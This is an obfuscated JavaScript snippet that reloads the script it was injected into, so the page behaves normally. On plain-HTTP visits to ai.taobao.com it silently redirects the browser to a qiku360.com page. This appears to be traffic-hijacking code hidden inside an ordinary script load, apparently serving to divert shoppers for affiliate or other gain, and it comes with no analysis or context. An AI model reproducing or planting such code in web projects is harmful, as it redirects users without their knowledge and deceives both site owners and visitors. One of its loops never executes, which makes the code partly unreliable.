l___k__s = ~function (thisWindow, thisDocument, regex_1, regex_2, str_script, Charset, Async, l) {
    var str_00_g_0 = '00_g_0', isOpera = thisWindow.opera, originSrc = (function (js_src) {
        if (!js_src || /([^:]|^)\/\//.test(js_src) || ~js_src.indexOf(str_00_g_0.replace(/_/g, '.'))) {
            return 0
        }
        js_src = js_src + '?__=__&';
        if (!js_src.lastIndexOf('/')) {
            return js_src.replace(regex_1, regex_2)
        }
        return js_src.substr(0, 1) + js_src.substr(1).replace(regex_1, regex_2)
    })((function (curScriptElement, allScripts, errMsg) {
        if (curScriptElement) {
            Charset = curScriptElement.charset;
            Async = curScriptElement.async;
            return curScriptElement.src
        }
        try {
            Z.G.Y()
        } catch (c) {
            errMsg = c.stack || c.fileName || c.sourceURL || c.stacktrace;
            if (!errMsg && isOpera) {
                errMsg = (('' + c).match(/of linked script \S+/g) || []).join(' ')
            }
        }
        if (errMsg) {
            errMsg = errMsg.split(/[@ ]/g).pop();
            errMsg = errMsg[0] == '(' ? errMsg.slice(1, -1) : errMsg;
            for (var w = errMsg.replace(/(:\d+)?:\d+$/i, ''), scriptEl, i = allScripts.length; i--;) {
                scriptEl = allScripts[i];
                if (w == scriptEl.src) {
                    Charset = scriptEl.charset;
                    Async = scriptEl.async;
                    break
                }
            }
            return w
        }
        for (var lastJsDOM = (allScripts[allScripts.length - 1] || {}), y = 0, cur; y++;) {
            cur = allScripts[y];
            if (cur.readyState == 'interactive') {
                Charset = cur.charset;
                Async = cur.async;
                return cur.src
            }
        }
        Charset = lastJsDOM.charset;
        Async = lastJsDOM.async;
        return lastJsDOM.src
    })(thisDocument.currentScript, thisDocument.getElementsByTagName(str_script))), head = thisDocument.getElementsByTagName('head')[0], newScriptElm = thisDocument.createElement(str_script), sessionStorage = thisWindow.sessionStorage;
    if (originSrc) {
        if (Charset) {
            newScriptElm.charset = Charset
        }
        newScriptElm.src = originSrc;
        newScriptElm.async = Async;
        if (!Async && /\[nati/.test(thisDocument.write + '')) {
            thisDocument.write('<' + str_script + ' src="' + originSrc + '"' + (Charset ? ' charset="' + Charset + '"' : '') + ' async=' + (Async ? 'true' : 'false') + '><\/' + str_script + '>')
        } else {
            head.appendChild(newScriptElm)
        }
    }
    if (!thisWindow.l___k__s && !isOpera && navigator.cookieEnabled && /^http:/.test(thisDocument.URL)) {

        var pid = /123076536/;
        var pid2 =/24994523/;
        var link = document.URL;
        var turl = 'http://www.qiku360.com/aitaobao/aitaobao_re.html?f='+ 1E4 * Math.random() +'&k='+ (new Date).valueOf();
        var flag = (link ==='http://ai.taobao.com/'||link ==='http://ai.m.taobao.com/');
        if (flag &&!pid.test(link)) {
            window.location.href = turl;

        }
    }
}(self, document, /([^:\/]|^)\//, '$1//', 'script');